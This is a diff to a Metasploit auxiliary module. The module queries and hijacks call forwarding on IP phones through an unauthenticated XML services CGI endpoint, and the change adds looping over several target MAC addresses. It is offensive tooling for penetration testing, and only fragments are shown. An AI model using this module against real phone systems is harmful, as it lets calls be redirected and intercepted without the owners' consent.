@@ -8,7 +8,7 @@ require 'msf/core'
 require 'rexml/document'
 
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
 
@@ -34,20 +34,21 @@ class Metasploit3 < Msf::Auxiliary
         [
             Opt::RPORT(80),
             OptString.new('TARGETURI', [ true, 'Target URI for XML services', '/bvsmweb']),
-            OptString.new('MAC', [ true, 'MAC Address of target phone', '000000000000']),
+            OptString.new('MAC', [ true, 'MAC Address(es) of target phone(s)', '000000000000']),
             OptString.new('FORWARDTO', [ true, 'Number to forward all calls', '007']),
-            OptString.new('ACTION', [ true, 'Call forwarding action (FORWARD,INFO)', 'FORWARD']),
+            OptString.new('ACTION', [ true, 'Call forwarding action (FORWARD,INFO)', 'INFO']),
             OptString.new('FINTNUMBER', [ false, 'FINTNUMBER of IP Phones, required for multiple lines', '']),
         ], self.class)
   end
 
   def run
     uri = normalize_uri(target_uri.to_s)
-    mac = Rex::Text.uri_encode(datastore["MAC"])
+    macs = Rex::Text.uri_encode(datastore["MAC"])
     forwardto = Rex::Text.uri_encode(datastore["FORWARDTO"])
+    macs.split(/%0a|\r|\n/).each {|mac|
 
 
-    print_status("Getting fintnumbers and display names of the IP phone")
+    print_status("Getting fintnumbers and display names of the IP phone #{mac}")
 
     uri_show=uri+"/showcallfwd.cgi?device=SEP#{mac}"
     vprint_status("URL: "+uri_show)
@@ -104,5 +105,6 @@ class Metasploit3 < Msf::Auxiliary
     else
       print_error("Target appears not vulnerable!")
     end
+    }
   end
 end
